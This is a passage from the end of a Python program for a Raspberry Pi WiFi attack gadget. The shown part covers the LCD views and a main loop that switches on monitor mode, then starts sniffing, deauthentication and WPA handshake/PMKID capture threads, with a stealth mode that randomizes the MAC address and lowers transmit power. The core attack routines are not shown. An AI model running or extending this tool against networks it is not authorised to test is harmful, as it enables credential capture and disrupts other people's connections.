            avg_sig = sum(sigs) // len(sigs)
            d.text((2, 105), f"AVG Signal: {avg_sig}dBm",
                   font=font_sm, fill="#888")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), f"{len(aps_list)}APs U/D:Scrl K1:View",
           font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Captures view (browsable history)
# ---------------------------------------------------------------------------


def _list_captures():
    """Return sorted list of capture filenames from HANDSHAKE_DIR."""
    if not os.path.isdir(HANDSHAKE_DIR):
        return []
    try:
        files = [f for f in os.listdir(HANDSHAKE_DIR) if f.endswith(".pcap")]
        files.sort(reverse=True)  # newest first
        return files
    except Exception:
        return []


def _draw_captures(lcd, font_obj, font_sm, scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    captures = _list_captures()
    count = len(captures)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#112211")
    d.text((2, 1), f"CAPTURES ({count})", font=font_sm, fill="#00FF00")

    if not captures:
        d.text((4, 40), "No captures yet", font=font_sm, fill="#666")
        d.text((4, 55), "Start hunting!", font=font_sm, fill="#444")
    else:
        visible = captures[scroll:scroll + 7]
        for i, fname in enumerate(visible):
            y = 16 + i * 14
            # Determine type by prefix for color coding
            name_display = fname.replace(".pcap", "")
            if fname.startswith("hs4_"):
                color = "#00FF00"   # green = full handshake
                prefix = "!"
            elif fname.startswith("hs_half_"):
                color = "#FFAA00"   # yellow = half handshake
                prefix = "~"
            elif fname.startswith("pmkid_"):
                color = "#FF00FF"   # purple = PMKID
                prefix = "*"
            else:
                color = "#CCCCCC"
                prefix = " "
            d.text((2, y), f"{prefix} {name_display[:21]}",
                   font=font_sm, fill=color)

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "U/D:Scroll K1:View K3:Back",
           font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Whitelist view
# ---------------------------------------------------------------------------


def _draw_whitelist(lcd, font_obj, font_sm, scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#442200")
    d.text((2, 1), "WHITELIST", font=font_sm, fill="#FFAA00")

    lines = []
    for mac in sorted(whitelist_macs):
        lines.append(f"MAC {mac[-11:]}")
    for ssid in sorted(whitelist_ssids):
        lines.append(f"SSID {ssid[:14]}")

    if not lines:
        d.text((4, 30), "Whitelist empty", font=font_sm, fill="#666")
        d.text((4, 45), "Edit config.json in", font=font_sm, fill="#666")
        d.text((4, 57), LOOT_DIR[:22], font=font_sm, fill="#444")
        d.text((4, 75), "Add your own WiFi", font=font_sm, fill="#666")
        d.text((4, 87), "to avoid deauthing it", font=font_sm, fill="#666")
    else:
        visible = lines[scroll:scroll + 7]
        for i, line in enumerate(visible):
            y = 16 + i * 13
            d.text((2, y), line[:22], font=font_sm, fill="#CCCCCC")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), f"{len(lines)} entries K1:View K3:X",
           font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main():
    global _running, capturing, deauth_enabled, stealth_enabled
    global mon_iface, view, original_mac, capture_flash

    capture_flash = 0  # ensure no residual flash from previous run
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    _load_stats()
    _load_config()

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font_obj = scaled_font(10)
    font_sm = scaled_font(8)

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font_obj, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    iface = select_interface(lcd, font_obj, PINS, GPIO, iface_type="wifi")
    if not iface:
        GPIO.cleanup()
        return 1

    # Save original MAC for restore
    original_mac = _get_mac(iface)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Monitor mode...", font=font_obj, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)

    mon_iface = _monitor_up(iface)
    if not mon_iface:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "Monitor mode fail", font=font_obj, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    # Start activity sampler thread
    threading.Thread(target=_activity_sampler, daemon=True).start()

    scroll = 0

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view != "face":
                    view = "face"
                    time.sleep(0.3)
                else:
                    break

            elif btn == "OK":
                if not capturing:
                    capturing = True
                    threading.Thread(target=_channel_hopper,
                                    daemon=True).start()
                    threading.Thread(target=_sniffer, daemon=True).start()
                    threading.Thread(target=_deauther, daemon=True).start()
                    threading.Thread(target=_half_hs_checker,
                                    daemon=True).start()
                else:
                    capturing = False
                time.sleep(0.3)

            elif btn in ("LEFT", "RIGHT") and view == "face":
                deauth_enabled = not deauth_enabled
                _save_config()
                time.sleep(0.3)

            elif btn == "KEY1":
                # Cycle views: face > stats > captures > whitelist
                if view == "face":
                    view = "stats"
                elif view == "stats":
                    view = "captures"
                elif view == "captures":
                    view = "whitelist"
                else:
                    view = "face"
                scroll = 0
                time.sleep(0.3)

            elif btn == "KEY2":
                # Toggle stealth
                stealth_enabled = not stealth_enabled
                if stealth_enabled and mon_iface:
                    _randomize_mac(mon_iface)
                    _reduce_tx_power(mon_iface)
                elif not stealth_enabled and mon_iface:
                    _restore_mac(mon_iface, original_mac)
                    _restore_tx_power(mon_iface)
                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                scroll += 1
                time.sleep(0.15)

            if view == "face":
                _draw_face(lcd, font_obj, font_sm)
            elif view == "stats":
                _draw_stats(lcd, font_obj, font_sm, scroll)
            elif view == "captures":
                _draw_captures(lcd, font_obj, font_sm, scroll)
            elif view == "whitelist":
                _draw_whitelist(lcd, font_obj, font_sm, scroll)

            time.sleep(0.05)

    finally:
        _running = False
        capturing = False
        _save_stats()
        _save_config()
        if stealth_enabled and mon_iface:
            _restore_mac(mon_iface, original_mac)
            _restore_tx_power(mon_iface)
        time.sleep(0.5)
        _monitor_down(mon_iface)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
